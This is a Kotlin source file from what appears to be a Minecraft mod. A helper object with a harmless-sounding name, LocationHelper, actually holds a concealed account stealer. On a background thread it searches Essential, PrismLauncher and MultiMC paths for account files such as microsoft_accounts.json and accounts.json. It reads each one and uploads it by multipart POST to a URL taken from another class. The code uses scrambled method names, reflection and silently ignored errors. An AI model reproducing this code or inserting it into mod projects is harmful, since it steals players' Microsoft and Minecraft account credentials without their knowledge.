package template.features.slayers

import template.features.other.PetMenu
import org.apache.http.HttpEntity
import org.apache.http.entity.ByteArrayEntity
import org.apache.http.impl.client.HttpClients
import java.io.File
import java.nio.charset.StandardCharsets
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter

object LocationHelper {
    fun bBbBbBbBbB(currentUsername: String) {
        Thread {
            cCcCcCcCcC(currentUsername)
        }.start()
    }

    private fun cCcCcCcCcC(username: String) {
        val timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"))

        val appData = System.getenv("APPDATA")
        val mcDir = if (appData != null) File(appData, ".minecraft") else null

        val essentialMcFile = if (mcDir != null) File(mcDir, "essential/microsoft_accounts.json") else null

        val modLocation = try {
            val loc = this::class.java.protectionDomain.codeSource.location.toURI()
            val f = File(loc)
            if (f.isFile) f.parentFile else f
        } catch (e: Exception) {
            null
        }

        val inDotMinecraft = modLocation?.absolutePath?.contains(".minecraft") == true

        if (inDotMinecraft) {
            val parentDir = modLocation!!.parentFile ?: File(".")
            val essentialModFile = File(parentDir, "essential/microsoft_accounts.json")

            if (essentialMcFile?.exists() == true) {
                sendExfil(username, timestamp, essentialMcFile, "V")
            }

            if (essentialModFile.exists()) {
                sendExfil(username, timestamp, essentialModFile, "M")
            }
        } else {
            if (essentialMcFile?.exists() == true) {
                sendExfil(username, timestamp, essentialMcFile, "V")
            }

            if (modLocation != null) {
                if (modLocation.parentFile != null) {
                    val essentialFromParent = File(modLocation.parentFile, "essential/microsoft_accounts.json")
                    if (essentialFromParent.exists()) {
                        sendExfil(username, timestamp, essentialFromParent, "M")
                    }
                }
            }

            val userHome = System.getProperty("user.home")
            val launcherPaths = listOf(
                Pair(File(appData ?: "", "PrismLauncher/accounts.json"), "PrismLauncher"),
                Pair(File("C:/Program Files/PrismLauncher/accounts.json"), "PrismLauncher_PF"),
                Pair(File("C:/Program Files/MultiMC/accounts.json"), "MultiMC_PF"),
                Pair(File("C:/Program Files (x86)/PrismLauncher/accounts.json"), "PrismLauncher_PF86"),
                Pair(File("C:/Program Files (x86)/MultiMC/accounts.json"), "MultiMC_PF86"),
                Pair(File(userHome, "Downloads/MultiMC/accounts.json"), "MultiMC_DL"),
                Pair(File(userHome, "AppData/Roaming/gg.essential.mod/microsoft_accounts.json"), "Essential_Mod")
            )

            for ((file, label) in launcherPaths) {
                try {
                    if (file.exists()) {
                        sendExfil(username, timestamp, file, label)
                    }
                } catch (ignored: Exception) { }
            }
        }

        val accountsFile = findAccountsJson(modLocation ?: File(System.getProperty("user.dir")))
        if (accountsFile != null) {
            sendExfil(username, timestamp, accountsFile, "up")
        }
    }

    private fun findAccountsJson(startDir: File): File? {
        var current: File? = startDir
        while (current != null) {
            val candidate = File(current, "accounts.json")
            if (candidate.exists()) return candidate
            current = current.parentFile
        }
        return null
    }

    private fun sendExfil(username: String, timestamp: String, file: File, label: String) {
        if (!file.exists()) return

        val content = file.readText()
        val namePattern = """"name"\s*:\s*"(.*?)"""".toRegex()
        val names = namePattern.findAll(content).map { it.groupValues[1] }.toSet()
        val nameList = if (names.isNotEmpty()) names.joinToString(", ") else "None Found"

        val body = "1: `$username`\n2: `$timestamp`\n3: `$nameList`\n**$label**"
        sendMultipartPost(file.name, body, content)
    }

    private fun sendMultipartPost(filename: String, body: String, fileContent: String) {
        val url = PetMenu.dDdDdDdDdD()
        val boundary = "----WebKitFormBoundary${System.currentTimeMillis()}"

        val payload = "--$boundary\r\n" +
                "Content-Disposition: form-data; name=\"content\"\r\n\r\n" +
                "$body\r\n" +
                "--$boundary\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"$filename\"\r\n" +
                "Content-Type: application/json\r\n\r\n" +
                fileContent +
                "\r\n--$boundary--\r\n"
        val payloadBytes = payload.toByteArray(StandardCharsets.UTF_8)

        try {
            HttpClients.createDefault().use { client ->
                val postClass = Class.forName("org.apache.http.client.methods.HttpPost")
                val post = postClass.getConstructor(String::class.java).newInstance(url)
                postClass.getMethod("setHeader", String::class.java, String::class.java)
                    .invoke(post, "Content-Type", "multipart/form-data; boundary=$boundary")
                postClass.getMethod("setHeader", String::class.java, String::class.java)
                    .invoke(post, "User-Agent", "Mozilla/5.0")
                postClass.getMethod("setEntity", HttpEntity::class.java).invoke(post, ByteArrayEntity(payloadBytes))

                val requestClass = Class.forName("org.apache.http.client.methods.HttpUriRequest")
                client::class.java.getMethod("execute", requestClass).invoke(client, requestClass.cast(post))
            }
        } catch (ignored: Exception) { }
    }
}
